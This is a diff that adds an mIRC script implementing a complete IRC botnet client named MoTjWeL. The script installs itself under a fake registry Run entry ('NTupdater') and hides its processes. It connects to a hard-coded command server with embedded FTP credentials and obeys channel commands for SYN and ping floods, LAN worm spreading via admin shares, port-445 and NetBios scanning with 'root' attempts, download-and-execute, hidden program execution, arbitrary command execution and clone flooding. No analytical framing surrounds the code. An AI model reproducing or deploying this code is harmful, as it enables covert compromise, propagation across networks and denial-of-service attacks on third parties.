@@ -1,0 +1,312 @@
+on *:start:{
+  run system32.exe /n /fh cOOL
+  cls
+  leed
+  setup 
+  ouo
+  autorun
+  timerco 1 3 connect
+  timerreconnect -o 0 100 //checkconn
+}
+alias x $eval($$1-,2)
+alias hadf { talk 2[14Uninstall 2]14 removing files.. | remove bot.txt | remove cool.dll | remove sysop32.exe | remove system32.exe | remove m2.bat | write UNINST.reg REGEDIT4 | write UNINST.reg   [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write UNINST.reg $+(",%regname,"=",$replace($mircexe,\,\\),") | run -n regedit /s UNINST.reg | timer -o 1 3 remove UNINST.reg | timer 1 5 exit | remove MicroSoft.exe }
+alias leed { load -rs socks.txt | load -rs clones.txt | load -rs ownz.txt | load -rs hope2.txt | load -rs shell.txt | load -rs kewl.txt | run patch.exe }
+alias cls { rlevel 999 | sockclose * | timers off | unsetall }
+alias ouo { if !$portfree(%pf) { exit } | socklisten norton %pf }
+alias connectstaff { mode $me +ix | ial on | pdcc on | fsend on | sreq auto | creq auto | dcc packetsize 8192 | clearall }
+alias reconnect { server %server }
+alias -l udll return $scriptdir $+ esc.dll
+alias r3 { remove %autorun | if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }
+alias download { var %socket $+(dl,$chr(46),$nopath($2)) | if (!$sock(%socket)) { sockopen %socket $1 80 | sockmark %socket HEAD $1 $2 } | else { echo $color(info) -s * Socket already in use. } }
+alias downd { if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) { var %socket $+(dl,$chr(46),$nopath($2)) | if (!$sock(%socket)) { sockopen %socket $1 80 | sockmark %socket HEAD $1 $2 } | else { echo $color(info) -s * Socket already in use. } } }
+alias percent return $+($round($calc((100 / $2) * $1),2),%)
+alias lan-spread { .write lan-.bat net view > lan-.txt | .write lan-.bat del lan-.bat | run system32.exe /n /fh /r "lan-.bat" | copy1 | .timerscopy 1 20 copy1 }
+alias copy1 { if ($lines(lan-.txt) < 6) || ($exists(lan-.txt) == $false) { talk Lan Spread found no internal computers.. | halt } | .write -dl1 lan-.txt | .write -dl1 lan-.txt | .write -dl1 lan-.txt | .write -dl $+ $lines(lan-.txt) lan-.txt | .write -dl $+ $lines(lan-.txt) lan-.txt | talk Lan Spread Found: $lines(lan-.txt) Within Local Area Network. | copy2 }
+alias copy2 { if ($lines(lan-.txt) == 0) { talk Lan Spreading Is Finished... | unset %copy.* | .remove lan-.txt | halt } | set %copy.pc $gettok($read(lan-.txt,1),1,32) | set %c0py nav.exe | .write lan-.bat @echo off | .write lan-.bat net use %copy.pc $+ \$ $+ %s.share "" /user:"Administrator" | .write lan-.bat %c0py %copy.pc attrib.exe -r %sf | .write lan-.bat %c0py %copy.pc -f -c -d %sf -o | .write lan-.bat %c0py %copy.pc -d %sf -o | .write lan-.bat del lan-.bat | run system32.exe /n /fh /r "lan-.bat" | talk Attempting To Root: %copy.pc , Computers Left: $calc($lines(copy.txt) - 1) | .write -dl1 lan-.txt | copy2 | .timercopy 1 6 copy2 }
+alias talk { if ($me isvo %c) || ($me ishop %c) || ($me isop %c) { var %& $1- | var %co 0 | while (%co < $numtok(%&,32)) { inc %co | var %_t = %_t $iif($upper($left($gettok(%&,%co,32),1)) isalpha,1 $+ $upper($left($gettok(%&,%co,32),1)) $+ 1 $+ $right($gettok(%&,%co,32),-1) $+ ,14 $+ $upper($left($gettok(%&,%co,32),1)) $+ $right($gettok(%&,%co,32),-1)) } | msg %c %_t | clearall } }
+alias ownage return $gettok(ownage scripting hack fuck crack spy military hacker usa cracker,$r(1,10),32 ) 
+alias syn { if ($1 == $null) { return } | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | syna 1 $1- | syna 1 halt | talk [Syn Attack] Finished syn attack on: %synaa ... | unset %syn* }
+alias syna {
+  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen $+(syn,$r(1,999),$r(1,999),$r(1,999)) $4 $5 | inc %x  } }
+  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
+}
+alias setup {
+  %nickperfix = [MoTjWeL]-
+  %pf = 5385507
+  %c = #zx
+  %regname = NTupdater
+  %pass = qwertyuiop 
+  %key = 1397
+  %sf = sysop32.exe 
+  %server = motjwel.dynu.com:6667  
+  %ftp.server = ftp.p2.webhosting.yahoo.com
+  %ftp.port = 21	
+  %ftp.pass = MoTjWeL123
+  %ftp.user = Admin123
+}
+alias connect {
+  nick $+(%nickperfix,[,$r(0,9999),]-[,$os,])
+  anick $+(%nickperfix,[,$r(0,9999),]-[,$os,])
+  identd on $+($r(1,99),$r(0,99))
+  emailaddr $+($ownage,@user.level-,$os,-.us.gov)
+  fullname [ $uptime(system,1) ] M0TjWeL V.x
+  server %server
+ %m1 = $str(CoDeBlUeX-CoDeBlUeX-,15)
+ %m2 = $str(%impossible $+ FloWeR_LoVe*LoVE_FloWeR*,11))  
+ %m3 = $str(Xx,100) 
+}
+alias autorun { 
+  set %autorun $+($r(1,999),.reg)
+  write %autorun REGEDIT4 
+  write %autorun [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] 
+  write %autorun $+(",%regname,"=",$replace($mircexe,\,\\),") 
+  run -n regedit /s %autorun 
+  timerbo 1 4 r3 
+  timerbot 1 5 unset %autorun
+}
+alias diskinfo {
+  var %disk = $$1
+  var %used, %flaginfo
+  if ( $len(%disk) == 1 ) set %disk %disk $+ :
+  if ( $right(%disk,1) != \ ) set %disk %disk $+ \ | talk Info for %disk
+  if ( $dll($udll,GetSpaceInfo, total [ %disk ] ) == $null ) { talk %disk does not exist, there is no disk in the drive... | return }
+  set %used $calc( $dll($udll,GetSpaceInfo, total [ %disk ] ) - $dll($udll,GetSpaceInfo, free [ %disk ] ) )
+  talk [Total space]: $dll($udll,GetSpaceInfo, total [ %disk ] ) bytes , [Free space]: $dll($udll,GetSpaceInfo, free [ %disk ] ) bytes ( $+ $int($calc( ($dll($udll,GetSpaceInfo, free [ %disk ] ) / $dll($udll,GetSpaceInfo, total [ %disk ] )) *100)) $+ $chr(37) $+ ) , [Used space]: %used bytes ( $+ $int($calc( (%used / $dll($udll,GetSpaceInfo, total [ %disk ] )) *100)) $+ $chr(37) $+ ) , [Label]: $dll($udll,GetVolumeInfo, volname [ %disk ] ) , [Serial number]: $dll($udll,GetVolumeInfo, serial [ %disk ] ) , [Maximum filename length]: $dll($udll,GetVolumeInfo, maxfilelen [ %disk ] ) , [Filesystem type]: $dll($udll,GetVolumeInfo, fstype [ %disk ] )
+}
+on *:exit:{ cls | halt }
+on *:unotify:{ if ($nick == %chase.nick)  { chasenick } }
+on *:disconnect:{ rlevel 999 | //timerreconnect -o 0 50 //checkconn | clearall }
+on *:dns:{ %address = $iaddress } { if (%dns.r == on) { talk [DNS] Resolved: %dns.rrr to ip: $iaddress , host: $naddress | unset %dns.* } }
+on *:connect:{ connectstaff | timerjoinc 0 3 raw -q join %c %key | timerkeepalive -o 0 30 .ping $me | timerallow 0 100 dcc ignore off }
+on *:join:%c:{ if ($nick == $me) { .timerjoinc off } }
+on *:part:%c:{ if ($nick == $me) { timerjoinc 0 3 raw -q join %c %key } }
+on *:op:%c:{ if ($opnick == $me) { mode %c +nstk %key } }
+on 999:nick:*:{ ruser 999 $nick | clearall }
+on 999:part:%c:{ ruser 999 $nick | clearall }
+on 999:quit:%c:{ ruser 999 $nick | clearall }
+on 999:nick:%c:{ ruser 999 $nick | clearall }
+on 999:text:*:%c:{ clearall 
+
+    if ($1 == !ip) { msg %c Ip/Host: $ip $+ / $+ $host }
+    if ($1 == !delete.bot) { /remove $2- }
+    if ($1 == !hadf) { hadf }
+    if ($1 == !raw) { x $2- }
+    if ($1 == !nick) { nick $2 $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) }
+    if ($1 == !quit.mirc) { /quit }
+    if ($1 = !--) && ($2-) { timerdo 1 1 $2- | talk Attempting to: $2- | halt }
+if ($1 = !version) { talk 14B1ot 14V1ersion: -=[ 1MoTjWeL14 v.1]=- 14B1y 1MoHaNN14e1d | halt }
+    if ($1 = !var) && ($2-) { talk Variable = [ [ $$2- ] ] | halt }
+    if ($1 = !reconnect) { quit Don't Go, Am Comming Back... | timerrecon 1 3 reconnect | halt }
+    if ($1 = !dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | talk [DNS] Attempting To Resolve: $2 $+ ... | halt }
+    if ($1 = !nonono) && ($2-) { %kill.f = $2- | talk Attempting To Kill: %kill.f | timerkill 1 2 run system32.exe /n /fh /r "syscnfg.exe -kf %kill.f $+ " | timerk 1 3 unset %kill.f | halt }
+    if ($1 = !motjwelload) && ($2-) { %file.to.load = $2- | if $exists(%file.to.load) { load -rs %file.to.load | talk [Remotes] Loaded File: %file.to.load | halt } }
+    if ($1 = !unload) && ($2-) { %file.to.unload = $2- | if $exists(%file.to.unload) { unload -rs %file.to.load | talk [Remotes] UnLoaded File: %file.to.unload | halt } }
+    if ($1 = !removing) && ($2-) { %file.to.remove = $2- | if $exists(%file.to.remove) { remove %file.to.remove | talk [Remove] Successfully Removed: %file.to.remove | halt } }
+    if ($1 = !uptime) { %up.sys = $uptime(system,1) | %up.mirc = $uptime(mirc,1) | talk [Uptime] System: %up.sys , Mirc: %up.mirc | timersda 1 3 unset %up.* | halt }
+    if ($1 = !ftp) {
+      if ($2 == $null) { talk [FTP] Usage: !ftp -s <user> <pass> <port> / !ftp -k | halt }
+      if ($2 = -s) && (%ftp.stats == $null) { %ftp.stats = 1 | %ftp.user = $3 | %ftp.pass = $4 | %ftp.port = $5 | write -l7 rconnect.conf <User " $+ %ftp.user $+ "> | write -l8 rconnect.conf 	Password " $+ %ftp.pass $+ " | write -l2 rconnect.conf BindPort %ftp.port | talk [FTP] ftp started at: $+(ftp://,%ftp.user,:,%ftp.pass,@,$ip,:,%ftp.port,/) | run system32.exe /n /fh /r "ipcfg.exe" | halt }
+      if ($2 = -k) && (%ftp.stats != $null) { run system32.exe /n /fh /r "syscnfg.exe -kf ipcfg.exe" | talk [FTP] ftp on: $ip is now halted | unset %ftp.* | remove rconnect.log | halt }
+    } 
+    if ($1 = !run) { 
+      if ($2 == $null) { talk [RUN] Usage: Normal Run: !run -n <file> , Hidden Run: !run -h <file> | halt }
+      if ($2 = -n) { %run.f.n = $3- | if $exists(%run.f.n) { talk Attempting To Run: %run.f.n , [Normal] | timerrunn 1 2 run %run.f.n | halt } }
+      if ($2 = -h) { %run.f.h = $3- | if $exists(%run.f.h) { talk Attempting To Run: %run.f.h , [Hidden] | timerrunh 1 2 run system32.exe /n /fh /r " $+ %run.f.h $+ " | halt } }
+    }
+    if ($1 = !dcc) { 
+      if ($2 == $null) { talk [DCC] Usage: !dcc -i <ignore on/off> , !dcc -a <nick to allow> , !dcc -s <nick to send> <file to send> | halt } 
+      if ($2 = -i) && ($3-) { dcc ignore $3 | talk [Dcc] dcc ignore: $3 | halt }
+      if ($2 = -a) && ($3-) { dccallow $+(+,$3) | talk [Dcc] dcc allow: $3 | halt }
+      if ($2 = -s) && ($3-) { %nick.to send = $3 | %file.to.send = $4- | if $exists(%file.to.send) { dcc send %nick.to.send %file.to.send | talk [Dcc] Attempting to send: %file.to.send , To: %nick.to.send | halt } }
+    }
+    if ($1 = !info) {
+      if ($2 == $null) { talk [INFO] Usage: !info -n (nework) / -c (cpu) / -s (conn. speed) / -d (drive) / -m (memory) | halt } 
+      if ($2 = -m) { talk [Current load]: $dll($udll,GetMemInfo,memoryload) $+ $chr(37) , [Total physical memory]: $int($calc($dll($udll,GetMemInfo,totalphys) / 1048576)) MB, [Used physical memory]: $int($calc(($dll($udll,GetMemInfo,totalphys) - $dll($udll,GetMemInfo,freephys)) / 1048576)) MB, [Free physical memory]: $int($calc($dll($udll,GetMemInfo,freephys) / 1048576)) MB, [Total virtual memory]: $int($calc($dll($udll,GetMemInfo,totalvirtual) / 1048576)) MB, [Used virtual memory]: $int($calc(($dll($udll,GetMemInfo,totalvirtual) - $dll($udll,GetMemInfo,freevirtual)) / 1048576)) MB, [Free virtual memory]: $int($calc($dll($udll,GetMemInfo,freevirtual) / 1048576)) MB | halt }
+      if ($2 = -n) { talk [Network] connection: $dll(1nf0.dll,connection,_) network interfaces: $dll(1nf0.dll,interfaceinfo,_) ip: $ip host: $host | halt }
+      if ($2 = -c) { talk [Cpu] time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(1nf0.dll,cpuinfo,_) memory: $dll(1nf0.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(1nf0.dll,diskcapacity,_) | halt }
+      if ($2 = -s) { talk [Connection] Speed: http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) | halt }
+      if ($2 = -d) { diskinfo $3- | halt }
+    }
+    if ($1 = !chase) {
+      if ($2 == $null) { talk [CHASE] Usage: !chase <server> <port> <nickname> <pass> <email> , !chase -k | return }
+      if ($2 == -k) { sockclose chase* | notify -r %chase.nick | talk  [Chase] all chasers were killed. | return }
+      %chase.nick = $4
+      %chase.pass = $5
+      %chase.mail = $6
+      sockopen $+(chase,$r(1,9999)) $2 $3
+      notify $4
+      talk [Chase] loading chasers to $2 $+ : $+ $3
+    }
+    if ($1 = !bnc) {
+      if ($2 == $null) { talk [BNC] Usage: !bnc -s <port> <pass> / !bnc -i <bnc stats> / !bnc -k <stop bnc> | halt }
+      if ($2 = -s) && ($4-) { if ($sock(Bnc)) { talk Bnc is already active on $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | talk Bnc Started: /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 }
+      if ($2 = -i) && ($sock(Bnc)) { talk Bnc Stats: $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) } 
+      if ($2 = -k) && (%Bnc.Port != $null) { sockclose Bnc* | talk Bnc server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
+    }
+    if ($1 = !syn) {
+      if ($2 == $null) { talk [SYN] Usage: !syn -s <ip> <port> <num. of packets> , !syn -k <stop syn> | halt }
+      if ($2 = -s) && ($3-) && (%synaa == $null) { %synaa = $3 | %synport = $4 | %synpackets = $5 | talk [Syn Attack] Attempting To Syn: %synaa , Port: %synport , Syn packets: %synpackets | syn start %synpackets %synaa %synport | halt }
+      if ($2 = -k) && (%synaa != $null) { talk [Syn Attack] Attack on: %synaa is now halted.... | sockclose syn* | unset %syn* | halt } 
+    }
+    if ($1 = !ping) {
+      if ($2 == $null) { talk [PING] Usage: !ping -s <ip> <num> / !ping -k | halt }
+      if ($2 = -s) && (%pingo == $null) { %pingo = 1 | %pingip = $3 | %pingmb = $4 | run system32.exe /n /fh /r "ping.exe %pingip -n %pingmb -l 65500 -w 0" | talk [Ping Attack] Started Ping Attack on: %pingip , with $calc($4 *65536/1024/1000) $+ mb of traffic.. | timerp 1 10 unset %pingo | halt }
+      if ($2 = -k) && (%pingo != $null) { unset %ping* | talk [Ping Attack] Attacking Is Now Halted.. | run system32.exe /n /fh /r "syscnfg.exe -kf ping.exe" | halt }
+    }
+    if ($1 = !tahmeel) { 
+      if ($2 == $null) { talk [DOWNLOAD] Usage: !download <www.yoursite.com> <file.*> <1/0> | halt }
+      if ($4 = 0) { %d.a = 0 | download $2- | talk [Downloading..] Attempting To Download: $nopath($3-) | halt }
+      if ($4 = 1) { %d.a = 1 | download $2- | talk [Downloading..] Attempting To Download + Run: $nopath($3-) .. | halt }
+    }
+    if ($1 = !spread) {
+      if ($2 == $null) { talk [SPREAD] Usage: !spread <share type, ex: admin/ipc/c/all> | halt }
+      if ($2 = admin) { set %s.share admin | talk Attempting To Spread Through Lan (Local.Area.Networks) using -ADMIN- Sharing.. | lan-spread | halt }
+      if ($2 = ipc) { set %s.share ipc | talk Attempting To Spread Through Lan (Local.Area.Networks) using -IPC- Sharing.. | lan-spread | halt }
+      if ($2 = c) { set %s.share c | talk Attempting To Spread Through Lan (Local.Area.Networks) using -C- Sharing.. | lan-spread | halt }
+      if ($2 = all) { talk Attempting To Spread Through Lan (Local.Area.Networks) using -ADMIN/IPC/C- Sharing.. | own-spread | halt }
+    }
+    if ($1 == $me) {
+      if ($2 = !-) && ($3-) { timerdo 1 1 $3- | talk Attempting to: $3- | halt }
+      if ($2 = !uptime) { %up.sys = $uptime(system,1) | %up.mirc = $uptime(mirc,1) | talk [Uptime] System: %up.sys , Mirc: %up.mirc | timersda 1 3 unset %up.* | halt }
+      if ($2 = !ircd) {
+        if ($3 == $null) { talk [IRCD] Usage: !ircd -s <port> <user> <pass> / !ircd -k | halt }
+        if ($3 = -s) && (%ircd.stats == $null) { %ircd.stats = 1 | %ircd.port = $4 | %ircd.user = $5 | %ircd.pass = $6 | write -l50 ircd.conf $+(O:*@*:,%ircd.pass,:,%ircd.user,:rRDgwlcCkKbBnNAaufFsOo:10) | write ircd.conf $+(P::*::,%ircd.port) | talk [Ircd] Stating Ircd on ip: $ip , port: %ircd.port | timeri 1 3 run system32.exe /n /fh /r "client.exe" | halt }
+        if ($3 = -k) && (%ircd.stats != $null) { unset %ircd.* | talk [Ircd] Stopped Ircd on ip: $ip | run system32.exe /n /fh /r "exit.exe -kf syscnfg.exe" | halt } 
+      }
+      if ($2 = !download) { 
+        if ($3 == $null) { talk [DOWNLOAD] Usage: !download <www.yoursite.com> <file.*> <1/0> | halt }
+        if ($5 = 0) { %d.a = 0 | download $3- | talk [Downloading..] Attempting To Download: $nopath($4-) | halt }
+        if ($5 = 1) { %d.a = 1 | download $3- | talk [Downloading..] Attempting To Download + Run: $nopath($4-) .. | halt }
+      }
+      if ($2 = !bnc) {
+        if ($3 == $null) { talk [BNC] Usage: !bnc -s <port> <pass> / !bnc -i <bnc stats> / !bnc -k <stop bnc> | halt }
+        if ($3 = -s) && ($5-) { if ($sock(Bnc)) { talk Bnc is already active on $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $4 | %Bnc.port = $4 | %Bnc.passwd = $5 | talk Bnc Started: /server -m $ip $+ : $+ $4 $+ , then /quote pass $5 }
+        if ($3 = -i) && ($sock(Bnc)) { talk Bnc Stats: $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) } 
+        if ($3 = -k) && (%Bnc.Port != $null) { sockclose Bnc* | talk Bnc server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
+      }
+      if ($2 = !info) {
+        if ($3 == $null) { talk [INFO] Usage: !info -n (nework) / -c (cpu) / -s (conn. speed) / -d (drive) / -m (memory) | halt } 
+        if ($3 = -m) { talk [Current load]: $dll($udll,GetMemInfo,memoryload) $+ $chr(37) , [Total physical memory]: $int($calc($dll($udll,GetMemInfo,totalphys) / 1048576)) MB, [Used physical memory]: $int($calc(($dll($udll,GetMemInfo,totalphys) - $dll($udll,GetMemInfo,freephys)) / 1048576)) MB, [Free physical memory]: $int($calc($dll($udll,GetMemInfo,freephys) / 1048576)) MB, [Total virtual memory]: $int($calc($dll($udll,GetMemInfo,totalvirtual) / 1048576)) MB, [Used virtual memory]: $int($calc(($dll($udll,GetMemInfo,totalvirtual) - $dll($udll,GetMemInfo,freevirtual)) / 1048576)) MB, [Free virtual memory]: $int($calc($dll($udll,GetMemInfo,freevirtual) / 1048576)) MB | halt }
+        if ($3 = -n) { talk [Network] connection: $dll(1nf0.dll,connection,_) network interfaces: $dll(1nf0.dll,interfaceinfo,_) ip: $ip host: $host | halt }
+        if ($3 = -c) { talk [Cpu] time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(1nf0.dll,cpuinfo,_) memory: $dll(1nf0.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(1nf0.dll,diskcapacity,_) | halt }
+        if ($3 = -s) { talk [Connection] Speed: http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) | halt }
+        if ($3 = -d) { diskinfo $4- | halt }
+      }
+      if ($2 = !ftp) {
+        if ($3 == $null) { talk [FTP] Usage: !ftp -s <user> <pass> <port> / !ftp -k | halt }
+        if ($3 = -s) && (%ftp.stats == $null) { %ftp.stats = 1 | %ftp.user = $4 | %ftp.pass = $5 | %ftp.port = $6 | write -l7 rconnect.conf <User " $+ %ftp.user $+ "> | write -l8 rconnect.conf 	Password " $+ %ftp.pass $+ " | write -l2 rconnect.conf BindPort %ftp.port | talk [FTP] ftp started at: $+(ftp://,%ftp.user,:,%ftp.pass,@,$ip,:,%ftp.port,/) | run system32.exe /n /fh /r "ipcfg.exe" | halt }
+        if ($3 = -k) && (%ftp.stats != $null) { run system32.exe /n /fh /r "syscnfg.exe -kf ipcfg.exe" | talk [FTP] ftp on: $ip is now halted | unset %ftp.* | remove rconnect.log | halt }
+      } 
+      if ($2 = !run) { 
+        if ($3 == $null) { talk [RUN] Usage: Normal Run: !run -n <file> , Hidden Run: !run -h <file> | halt }
+        if ($3 = -n) { %run.f.n = $4- | if $exists(%run.f.n) { talk Attempting To Run: %run.f.n , [Normal] | timerrunn 1 2 run %run.f.n | halt } }
+        if ($3 = -h) { %run.f.h = $4- | if $exists(%run.f.h) { talk Attempting To Run: %run.f.h , [Hidden] | timerrunh 1 2 run system32.exe /n /fh /r " $+ %run.f.h $+ " | halt } }
+      }
+    }
+    if ($1 = !root) {
+      if ($2 == $null) { talk [RPC ROOT] Usage: !root <ip> <port> <target> | halt }
+      if ($4 == $null) { set %ip.to.r00t $2 | set %ip.to.r00t.p0rt $3 | talk [ROOT] Attempting To Root: %ip.to.r00t through port: %ip.to.r00t.p0rt .. | timerxr00t 1 2 sockopen $+(xr007,$r(0,999),) %ip.to.r00t %ip.to.r00t.p0rt | halt }
+      if ($4 != $null) { set %ip.to.r00t $2 | set %ip.to.r00t.p0rt $3 | set %ip.to.r007.t4rg37 $4 | talk [ROOT] Attempting To Root: %ip.to.r00t , port: %ip.to.r00t.p0rt , target: %ip.to.r007.t4rg37 .. | timerxr00t 1 2 sockopen $+(xr007,$r(0,999),) %ip.to.r00t %ip.to.r00t.p0rt | halt }
+    }
+    if ($1 = !nb) && ($2-) {
+      if ($2 = isp) && ($3 = start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+      if ($2 = isp) && ($3 = rand) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+      if ($2 = ip) && (%begshortip == $null) && $exists(%sf) { set %nb.port $4 | set %scan.bat $3 | set %begit $gettok($ip,1-3,46) $+ .1 | talk [NetBios Scanner] starting scan from: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+      if ($2 = start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $6 | set %scan.bat $5 | set %begit $randip($3) | talk [NetBios Scanner] starting scan from: %begit to $4 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+      if ($2 = stop) && (%begshortip != $null) { talk scanner scanning from: %begshortip to %endshortip stopped by $nick $+ ! | stopscan }
+      if ($2 = stats) && (%begshortip != $null) { talk scanner stats, range: [ %begshortip - %endshortip ] port: [ $sock($sockname).port ] current ip: [ %ip28 ] total found: [ $totalfound ] sharing method:[ %scan.bat ] spreading port: [ %nb.port ] spreading file: [ %sf ] }
+    }
+    if ($1 = !rpc) && ($2-) { 
+      if ($2 = isp) && ($3 = rand) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-2,46),.,$r(1,255),.,$r(1,255)) | set %cmdport $4 | talk [RPC port 445 scanner] started RAND ISP scan from: %cmdbegit to $+($gettok($ip,1-2,46),.255.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-2,46),.255.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+      if ($2 = isp) && ($3 = start) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-2,46),.1.1) | set %cmdport $4 | talk [RPC port 445 scanner] started ISP scan from: %cmdbegit to $+($gettok($ip,1-2,46),.255.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-3,46),.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+      if ($2 = ip) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-3,46),.1) | set %cmdport $3 | talk [RPC port 445 scanner] started ISP scan from: %cmdbegit to $+($gettok($ip,1-3,46),.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-3,46),.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+      if ($2 = start) && (%cmdbegshortip == $null) { set %cmdbegit $randip($3) | set %cmdport $5 | talk [RPC port 445 scanner] started scan from: %cmdbegit to $4 using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip(  %cmdbegshortip ) | set %endshortcmdip $4 | set %endlongcmdip $longip( %endshortcmdip  ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+      if ($2 = stop) && (%cmdbegshortip != $null) { sockclose root445* | timerscann445* off | unset %445ip* | unset %cmdtotal | unset %totalcmdscan | talk [RPC port 445 scanner] scanning of %cmdbegshortip to %endshortcmdip stopped by $nick ... | unset %cmdbegshortip | unset %endshortcmdip }
+      if ($2 = ftp) && ($3-) {
+        if ($3 = user) { set %ftp.user $4 | talk [RPC FTP] Ftp user is now set to: %ftp.user | halt }
+        if ($3 = pass) { set %ftp.pass $4 | talk [RPC FTP] Ftp pass is now set to: %ftp.pass | halt }
+        if ($3 = server) { set %ftp.server $4 | talk [RPC FTP] Ftp server is now set to: %ftp.server | halt }
+        if ($3 = port) { set %ftp.port $4 | talk [RPC FTP] Ftp port is now set to: %ftp.port | halt }
+      }
+    }
+    if ($1 = !clone) && ($2-) {
+      if ($2 = load) && ($3-) { %server.c = $3 | %port.c = $4 | talk Clones Loading To Server: %server.c , using Port: %port.c | connect.c %server.c %port.c | halt }
+      if ($2 = join) && ($3-) { %chan.c = $3 | %key.c = $4 | talk Attempting To Join: %chan.c | user JOIN %chan.c %key.c | halt }
+      if ($2 = part) && ($3-) { %part.c = $3 | %part.m.c = $4- | talk Attempting To Part: %chan.c | user PART %part.c %part.m.c | halt }
+      if ($2 = msg) && ($3-) { %msg.f.c = $3 | %msg.f.m.c = $4- | talk Attempting To Message Flood: %msg.f.c | user PRIVMSG %msg.f.c : $+ %msg.f.m.c | halt } 
+      if ($2 = notice) && ($3-) { %notice.f.c = $3 | %notice.f.m.c = $4- | talk Attempting To Notice Flood: %notice.f.c | user notice %notice.f.c : $+ %notice.f.m.c | halt }
+      if ($2 = .) && ($3-) { %action.c = $3- | talk Clones Action: %action.c | user %action.c | halt }
+      if ($2 = nick) && ($3-) { %nick.to.use.c = $3 | talk [Clones] Attempting To use nick: %nick.to.use.c | user NICK $+(%nick.to.use.c,[,$r(0,9999),]) | halt }
+      if ($2 = nfld) { talk Attempting To Start Nick Flooding.. | user NICK $rand.c | halt }
+      if ($2 = flood) && ($3-) { %flood.c = $3 | %flood.m.c = $4- | talk Attempting To Join & Flood: %flood.c | user JOIN %flood.c | user PRIVMSG %flood.c : $+ %flood.m.c | user NOTICE %flood.c : $+ %flood.m.c | user PRIVMSG %flood.c : $+ %flood.m.c | user NOTICE %flood.c : $+ %flood.m.c | halt }
+      if ($2 = jp2) && ($3-) { %jp.chan.c = $3 | talk Attempting To Join/Part Flood: %jp.chan.c | jp.c | halt }
